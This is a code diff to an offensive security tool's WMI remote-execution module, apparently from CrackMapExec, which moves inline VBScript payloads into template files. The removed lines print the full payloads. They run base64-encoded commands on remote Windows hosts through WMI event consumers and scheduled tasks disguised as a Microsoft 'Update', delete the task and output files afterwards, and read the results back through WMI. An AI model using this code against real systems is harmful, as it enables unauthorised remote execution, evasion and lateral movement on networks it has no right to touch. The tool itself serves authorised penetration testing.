@@ -30,6 +30,7 @@ import base64
 import sys
 
 from io import StringIO
+from cme.helpers.powershell import get_ps_script
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom.wmi import WBEMSTATUS
@@ -101,171 +102,19 @@ class WMIEXEC_EVENT:
         #   but we can base64 encode it and submit the data without spcial charters to avoid it.
         if self.__retOutput:
             output_file = f"{str(uuid.uuid4())}.txt"
-            vbs = fr'''
-Dim command, outputPath
-command = Base64StringDecode("{base64.b64encode(command.encode()).decode()}")
-outputPath = "C:\Windows\Temp\{output_file}"
-
-On Error Resume Next
-Set objTestNewInst = GetObject("Winmgmts:root\subscription:ActiveScriptEventConsumer.Name=""{self.__instanceID_StoreResult}""")
-If Err.Number <> 0 Then
-    Err.Clear
-    If FileExists(outputPath) Then
-        inputFile = outputPath
-        Set inStream = CreateObject("ADODB.Stream")
-        inStream.Open
-        inStream.type= 1 'TypeBinary
-        inStream.LoadFromFile(inputFile)
-        readBytes = inStream.Read()
-
-        Set oXML = CreateObject("Msxml2.DOMDocument")
-        Set oNode = oXML.CreateElement("base64")
-        oNode.dataType = "bin.base64"
-        oNode.nodeTypedValue = readBytes
-        Base64Encode = oNode.text
-
-        ' Write back into wmi class
-        wbemCimtypeString = 8
-        Set objClass = GetObject("Winmgmts:root\subscription:ActiveScriptEventConsumer")
-        Set objInstance = objClass.spawninstance_
-        objInstance.name="{self.__instanceID_StoreResult}"
-        objInstance.scriptingengine="vbscript"
-        objInstance.scripttext = Base64Encode
-        objInstance.put_
-    Else
-        Const TriggerTypeDaily = 1
-        Const ActionTypeExec = 0
-        Set service = CreateObject("Schedule.Service")
-        Call service.Connect
-        Dim rootFolder
-        Set rootFolder = service.GetFolder("\")
-        Dim taskDefinition
-        Set taskDefinition = service.NewTask(0)
-        Dim regInfo
-        Set regInfo = taskDefinition.RegistrationInfo
-        regInfo.Description = "Update"
-        regInfo.Author = "Microsoft"
-        Dim settings
-        Set settings = taskDefinition.settings
-        settings.Enabled = True
-        settings.StartWhenAvailable = True
-        settings.Hidden = False
-        settings.DisallowStartIfOnBatteries = False
-        Dim triggers
-        Set triggers = taskDefinition.triggers
-        Dim trigger
-        Set trigger = triggers.Create(7)
-        Dim Action
-        Set Action = taskDefinition.Actions.Create(ActionTypeExec)
-        Action.Path = "c:\windows\system32\cmd.exe"
-        Action.arguments = "/Q /c " & command & " 1> " & outputPath & " 2>&1"
-        Dim objNet, LoginUser
-        Set objNet = CreateObject("WScript.Network")
-        LoginUser = objNet.UserName
-        If UCase(LoginUser) = "SYSTEM" Then
-        Else
-        LoginUser = Empty
-        End If
-        Call rootFolder.RegisterTaskDefinition("{schedule_taskname}", taskDefinition, 6, LoginUser, , 3)
-        Call rootFolder.DeleteTask("{schedule_taskname}",0)
-    End If
-Else
-    On Error Resume Next
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    fso.DeleteFile(outputPath)
-    If Err.Number <> 0 Then
-        Err.Clear
-    End If
-End If
-
-Function FileExists(FilePath)
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    If fso.FileExists(FilePath) Then
-        FileExists=CBool(1)
-    Else
-        FileExists=CBool(0)
-    End If
-End Function
-
-Function Base64StringDecode(ByVal vCode)
-    Set oXML = CreateObject("Msxml2.DOMDocument")
-    Set oNode = oXML.CreateElement("base64")
-    oNode.dataType = "bin.base64"
-    oNode.text = vCode
-    Set BinaryStream = CreateObject("ADODB.Stream")
-    BinaryStream.Type = 1
-    BinaryStream.Open
-    BinaryStream.Write oNode.nodeTypedValue
-    BinaryStream.Position = 0
-    BinaryStream.Type = 2
-    ' All Format =>  utf-16le - utf-8 - utf-16le
-    BinaryStream.CharSet = "utf-8"
-    Base64StringDecode = BinaryStream.ReadText
-    Set BinaryStream = Nothing
-    Set oNode = Nothing
-End Function
-'''
+            with open(get_ps_script("wmiexec_event_vbscripts/Exec_Command_WithOutput.vbs"), "r") as vbs_file:
+                vbs = vbs_file.read()
+            vbs = vbs.replace("REPLACE_ME_BASE64_COMMAND", base64.b64encode(command.encode()).decode())
+            vbs = vbs.replace("REPLACE_ME_OUTPUT_FILE", output_file)
+            vbs = vbs.replace("REPLACE_ME_INSTANCEID", self.__instanceID_StoreResult)
+            vbs = vbs.replace("REPLACE_ME_TEMP_TASKNAME", schedule_taskname)
         else:
             # From wmihacker
             # Link: https://github.com/rootclay/WMIHACKER/blob/master/WMIHACKER_0.6.vbs
-            vbs = fr'''
-Dim command
-command = Base64StringDecode("{base64.b64encode(command.encode()).decode()}")
-
-Const TriggerTypeDaily = 1
-Const ActionTypeExec = 0
-Set service = CreateObject("Schedule.Service")
-Call service.Connect
-Dim rootFolder
-Set rootFolder = service.GetFolder("\")
-Dim taskDefinition
-Set taskDefinition = service.NewTask(0)
-Dim regInfo
-Set regInfo = taskDefinition.RegistrationInfo
-regInfo.Description = "Update"
-regInfo.Author = "Microsoft"
-Dim settings
-Set settings = taskDefinition.settings
-settings.Enabled = True
-settings.StartWhenAvailable = True
-settings.Hidden = False
-settings.DisallowStartIfOnBatteries = False
-Dim triggers
-Set triggers = taskDefinition.triggers
-Dim trigger
-Set trigger = triggers.Create(7)
-Dim Action
-Set Action = taskDefinition.Actions.Create(ActionTypeExec)
-Action.Path = "c:\windows\system32\cmd.exe"
-Action.arguments = "/Q /c " & command
-Dim objNet, LoginUser
-Set objNet = CreateObject("WScript.Network")
-LoginUser = objNet.UserName
-If UCase(LoginUser) = "SYSTEM" Then
-Else
-LoginUser = Empty
-End If
-Call rootFolder.RegisterTaskDefinition("{schedule_taskname}", taskDefinition, 6, LoginUser, , 3)
-Call rootFolder.DeleteTask("{schedule_taskname}",0)
-
-Function Base64StringDecode(ByVal vCode)
-    Set oXML = CreateObject("Msxml2.DOMDocument")
-    Set oNode = oXML.CreateElement("base64")
-    oNode.dataType = "bin.base64"
-    oNode.text = vCode
-    Set BinaryStream = CreateObject("ADODB.Stream")
-    BinaryStream.Type = 1
-    BinaryStream.Open
-    BinaryStream.Write oNode.nodeTypedValue
-    BinaryStream.Position = 0
-    BinaryStream.Type = 2
-    ' All Format =>  utf-16le - utf-8 - utf-16le
-    BinaryStream.CharSet = "utf-8"
-    Base64StringDecode = BinaryStream.ReadText
-    Set BinaryStream = Nothing
-    Set oNode = Nothing
-End Function
-'''
+            with open(get_ps_script("wmiexec_event_vbscripts/Exec_Command_Silent.vbs"), "r") as vbs_file:
+                vbs = vbs_file.read()
+            vbs = vbs.replace("REPLACE_ME_BASE64_COMMAND", base64.b64encode(command.encode()).decode())
+            vbs = vbs.replace("REPLACE_ME_TEMP_TASKNAME", schedule_taskname)
         return vbs
 
     def checkError(self, banner, call_status):
